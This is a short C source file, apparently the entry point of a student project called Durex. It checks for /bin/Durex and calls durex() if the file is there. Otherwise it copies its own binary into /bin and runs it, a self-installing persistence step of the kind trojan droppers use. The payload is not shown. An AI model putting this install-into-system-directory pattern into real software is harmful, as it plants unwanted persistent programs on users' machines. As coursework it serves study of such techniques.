/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/04/10 22:00:04 by root              #+#    #+#             */
/*   Updated: 2018/07/13 00:14:52 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include "durex.h"

int main()
{
	struct stat buf;

	if (setuid(getuid()) == -1)
		return 1;
	if (lstat("/bin/Durex", &buf) != -1)
		return durex();
	write(STDIN_FILENO, "gbourgeo\n", 9);
	system("/bin/cp Durex /bin");
	system("/bin/Durex");
	return 0;
}
